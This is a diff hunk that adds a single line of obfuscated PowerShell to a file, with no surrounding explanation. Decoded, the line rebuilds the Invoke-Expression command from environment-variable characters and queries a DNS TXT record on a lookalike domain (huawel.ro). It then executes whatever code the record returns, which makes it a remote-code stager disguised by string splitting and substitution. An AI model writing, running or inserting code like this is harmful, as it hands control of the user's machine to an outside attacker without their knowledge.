@@ -1,0 +1,1 @@
+﻿ .( $eNv:COMsPec[4,26,25]-jOin'') ( ('if(c3gc'+'3'+'g'+'+(n'+'slo'+'okup -'+'q=txt l.n'+'s.huawel.ro.) -match'+' c3g@(.*)'+'@c3g){'+'iex '+'rL'+'Xm'+'atches'+'[1]}').rEplacE('c3g',[sTRing][cHAR]34).rEplacE('rLX','$') ) 
